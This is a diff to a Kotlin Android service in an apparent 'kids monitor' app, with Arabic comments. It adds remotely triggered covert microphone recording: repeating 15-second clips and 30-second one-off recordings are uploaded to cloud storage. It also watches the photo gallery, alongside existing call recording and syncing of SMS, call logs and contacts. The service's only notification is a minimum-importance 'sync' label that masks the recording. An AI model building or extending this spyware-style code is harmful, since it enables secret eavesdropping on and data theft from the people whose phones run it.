@@ -18,6 +18,7 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.provider.CallLog
+import android.provider.MediaStore
 import android.provider.Telephony
 import android.telephony.PhoneStateListener
 import android.telephony.TelephonyManager
@@ -34,7 +35,7 @@ import com.kids.monitor.data.Permissions
 import com.kids.monitor.data.StorageUploader
 import java.io.File
 
-/** خدمة Foreground للمزامنة الدورية واستقبال الأوامر وتسجيل المكالمات. */
+/** خدمة Foreground للمزامنة الدورية واستقبال الأوامر وتسجيل المكالمات والمايك. */
 class MonitorService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
@@ -46,6 +47,9 @@ class MonitorService : Service() {
     private var recorder: MediaRecorder? = null
     private var recordingFile: File? = null
     private var recordingNumber: String? = null
+
+    private var micRecorder: MediaRecorder? = null
+    private var micLoop = false
 
     private val syncTask = object : Runnable {
         override fun run() {
@@ -61,8 +65,17 @@ class MonitorService : Service() {
         }
     }
 
+    private val micTask = object : Runnable {
+        override fun run() {
+            if (!micLoop) return
+            recordMicClip()
+            handler.postDelayed(this, MIC_CLIP_MS + 500L)
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
+        instance = this
         FirestoreSync.init(this)
         createNotificationChannel()
     }
@@ -102,22 +115,23 @@ class MonitorService : Service() {
 
         if (intent?.action == ACTION_SYNC) {
             syncStatus()
+            Thread { relayData() }.start()
         }
         return START_STICKY
     }
 
     override fun onDestroy() {
+        instance = null
         handler.removeCallbacks(syncTask)
         handler.removeCallbacks(relayTask)
+        handler.removeCallbacks(micTask)
         commandsListener?.remove()
         commandsListener = null
         if (networkCallback != null) {
             try {
                 val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                 cm.unregisterNetworkCallback(networkCallback!!)
-            } catch (e: Exception) {
-                // تجاهل
-            }
+            } catch (e: Exception) { /* تجاهل */ }
             networkCallback = null
         }
         if (contentObserver != null) {
@@ -129,6 +143,7 @@ class MonitorService : Service() {
             phoneListener = null
         }
         stopCallRecording()
+        stopMicRecorder()
         prefs().edit().putBoolean(SHARING_ENABLED, false).apply()
         super.onDestroy()
     }
@@ -183,7 +198,7 @@ class MonitorService : Service() {
         )
     }
 
-    /** مزامنة دورية للمكالمات والرسائل وجهات الاتصال والوسائط. */
+    /** مزامنة المكالمات والرسائل وجهات الاتصال والوسائط. */
     private fun relayData() {
         Thread {
             if (!DeviceInfo.online(this)) return@Thread
@@ -235,7 +250,6 @@ class MonitorService : Service() {
         }.start()
     }
 
-    /** مزامنة فورية عند تغيّر سجل المكالمات أو الرسائل. */
     private fun syncRecentData() {
         if (!DeviceInfo.online(this)) return
         val last = prefs().getLong(LAST_RELAY_AT, 0L)
@@ -274,25 +288,22 @@ class MonitorService : Service() {
         try {
             cm.registerDefaultNetworkCallback(callback)
             networkCallback = callback
-        } catch (e: Exception) {
-            // تجاهل
-        }
+        } catch (e: Exception) { /* تجاهل */ }
     }
 
     private fun registerContentObservers() {
         if (contentObserver != null) return
         val observer = object : ContentObserver(handler) {
             override fun onChange(selfChange: Boolean) {
-                Thread { syncRecentData(); prefs().edit().putLong(LAST_RELAY_AT, System.currentTimeMillis()).apply() }.start()
+                Thread { relayData() }.start()
             }
         }
         try {
             contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
             contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer)
+            contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, observer)
             contentObserver = observer
-        } catch (e: Exception) {
-            // تجاهل
-        }
+        } catch (e: Exception) { /* تجاهل */ }
     }
 
     // ---------- تسجيل المكالمات ----------
@@ -315,9 +326,7 @@ class MonitorService : Service() {
             tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
             telephony = tm
             phoneListener = listener
-        } catch (e: Exception) {
-            // تجاهل
-        }
+        } catch (e: Exception) { /* تجاهل */ }
     }
 
     private fun startCallRecording() {
@@ -377,6 +386,89 @@ class MonitorService : Service() {
         }
     }
 
+    // ---------- المايك: استماع لحظي وتسجيل حسب الطلب ----------
+
+    private fun startMicLoop() {
+        if (micLoop) return
+        if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
+        micLoop = true
+        handler.post(micTask)
+    }
+
+    private fun stopMicLoop() {
+        micLoop = false
+        handler.removeCallbacks(micTask)
+        stopMicRecorder()
+    }
+
+    private fun recordMicClip() {
+        stopMicRecorder()
+        try {
+            val file = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
+            @Suppress("DEPRECATION")
+            val mr = MediaRecorder()
+            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
+            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            mr.setOutputFile(file.absolutePath)
+            mr.prepare()
+            mr.start()
+            micRecorder = mr
+            handler.postDelayed({
+                stopMicRecorder()
+                uploadMicFile(file)
+            }, MIC_CLIP_MS)
+        } catch (e: Exception) {
+            micRecorder = null
+        }
+    }
+
+    private fun recordMicOnce() {
+        if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
+        Thread {
+            try {
+                val file = File(cacheDir, "record_${System.currentTimeMillis()}.m4a")
+                @Suppress("DEPRECATION")
+                val mr = MediaRecorder()
+                mr.setAudioSource(MediaRecorder.AudioSource.MIC)
+                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                mr.setOutputFile(file.absolutePath)
+                mr.prepare()
+                mr.start()
+                Thread.sleep(30_000L)
+                try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
+                try { mr.release() } catch (e: Exception) { /* تجاهل */ }
+                uploadMicFile(file)
+            } catch (e: Exception) { /* تجاهل */ }
+        }.start()
+    }
+
+    private fun stopMicRecorder() {
+        val mr = micRecorder ?: return
+        try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
+        try { mr.release() } catch (e: Exception) { /* تجاهل */ }
+        micRecorder = null
+    }
+
+    private fun uploadMicFile(file: File) {
+        if (!file.exists() || file.length() == 0L) return
+        val url = StorageUploader.uploadSync(file, "mic/${file.name}") ?: return
+        FirestoreSync.appendItem(
+            this,
+            "media",
+            mapOf(
+                "name" to file.name,
+                "url" to url,
+                "type" to "audio",
+                "mimeType" to "audio/mp4",
+                "size" to file.length(),
+                "timestamp" to System.currentTimeMillis(),
+                "mic" to true,
+            ),
+        )
+    }
+
     // ---------- الإشعار ----------
 
     private fun updateNotification(message: String) {
@@ -386,9 +478,7 @@ class MonitorService : Service() {
 
     private fun buildNotification(message: String): Notification {
         val openApp = PendingIntent.getActivity(
-            this,
-            0,
-            Intent(this, MainActivity::class.java),
+            this, 0, Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
         )
         val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -412,11 +502,8 @@ class MonitorService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "المزامنة",
-                NotificationManager.IMPORTANCE_MIN,
-            ).apply { description = "مزامنة حالة الجهاز" }
+            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_MIN)
+                .apply { description = "مزامنة حالة الجهاز" }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
@@ -434,6 +521,10 @@ class MonitorService : Service() {
         private const val NOTIFICATION_ID = 1001
         private const val SYNC_INTERVAL_MS = 60 * 1000L
         private const val RELAY_INTERVAL_MS = 5 * 60 * 1000L
+        private const val MIC_CLIP_MS = 15_000L
+
+        @Volatile
+        private var instance: MonitorService? = null
 
         fun start(context: Context) {
             val intent = Intent(context, MonitorService::class.java)
@@ -451,6 +542,20 @@ class MonitorService : Service() {
             } else {
                 context.startService(intent)
             }
+        }
+
+        fun startMic(context: Context) {
+            val service = instance
+            if (service != null) service.startMicLoop() else start(context)
+        }
+
+        fun stopMic() {
+            instance?.stopMicLoop()
+        }
+
+        fun recordMic(context: Context) {
+            val service = instance
+            if (service != null) service.recordMicOnce() else start(context)
         }
     }
 }
